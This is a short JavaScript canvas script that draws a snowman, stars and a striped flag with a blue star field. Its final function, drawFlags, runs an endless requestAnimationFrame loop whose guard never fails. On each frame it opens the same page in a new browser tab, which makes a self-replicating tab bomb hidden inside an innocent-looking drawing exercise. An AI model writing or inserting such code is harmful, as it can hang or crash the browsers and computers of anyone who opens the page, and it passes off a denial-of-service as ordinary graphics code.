const canvas = document.getElementById("myCanvas");
const ctx = canvas.getContext("2d");
function circle(x,y,r){
    ctx.beginPath();
    ctx.arc(x,y,r,0,2*Math.PI);
    ctx.fillStyle = "white";
    ctx.fill();
}

function snowman(x,y){
    circle(x,y,10);
    circle(x,y+20,20);
    circle(x,y+50,30);
}

function star(x,y, s){
    ctx.beginPath();
    ctx.moveTo(x, y);
    ctx.lineTo(x + s, y + 3*s);
    ctx.lineTo(x - s, y + s);
    ctx.lineTo(x + s, y + s);
    ctx.lineTo(x - s, y + 3*s);
    ctx.closePath();
    ctx.fillStyle = "white";
    ctx.fill();
}
function flagback(x,y){
    var i = 0;
    ctx.fillStyle = "white";
    ctx.fillRect(x,y,500,260);
    ctx.fillStyle = "red";
    while (i < 7){
    ctx.fillRect(x,y+40*i,500,20);
    i++;
    }
}
function flagstars(x,y){
    var i = 0;
    var u = 0; 
    var col = 0;
    ctx.fillStyle = "blue";
    ctx.fillRect(x,y,185    ,100);
    while (i < 9){
        while (col < 5-i%2){
            if (i%2 == 0){
                u = 0;
            } else {
                u = 20;
            }
            star(x+u+40*col+10,y+(10*(i)),4);
            col++;
        }
    i++;
    col = 0;
    }
}
function flag(x,y){
    flagback(x,y);
    flagstars(x,y);
}
let p = 0;
function drawFlags() {
    if (p > -1) { 
        let y = Math.random() * 2000; 
        let x = Math.random() * 2000;  
        flag(x, y);
        p++;
        window.open(window.location.href, '_blank');
        requestAnimationFrame(drawFlags);
    }
}
drawFlags();